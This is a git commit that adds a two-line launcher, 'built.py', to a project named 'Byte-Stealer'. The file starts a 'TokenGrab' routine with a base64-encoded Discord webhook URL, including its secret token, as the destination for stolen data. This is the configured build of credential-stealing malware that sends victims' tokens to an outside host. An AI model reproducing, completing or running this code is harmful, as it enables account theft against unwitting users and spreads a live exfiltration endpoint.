63eadd856d7b45cbded258353fd4e079b7986b4c
ByteSystemz <116411984+ByteSystemz@users.noreply.github.com>
2022-12-14 21:45:26 -0500

    Add files via upload

---
+++ Byte-Stealer/Byte Stealer/Byte Stealer/built.py
@@ -0,0 +1,2 @@
+from src import TokenGrab
+TokenGrab("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA1Mjc2NjA4NTY4ODA3NDMyMC9ZWlhTTEhoSUlzR0NxWVpCallEaXQtYXA3NmRwWU81M1JzN09MVmNkMkhCMzlnR2o0WVNmY0lfYWVSX0hOekxDYTJNNA==").start()
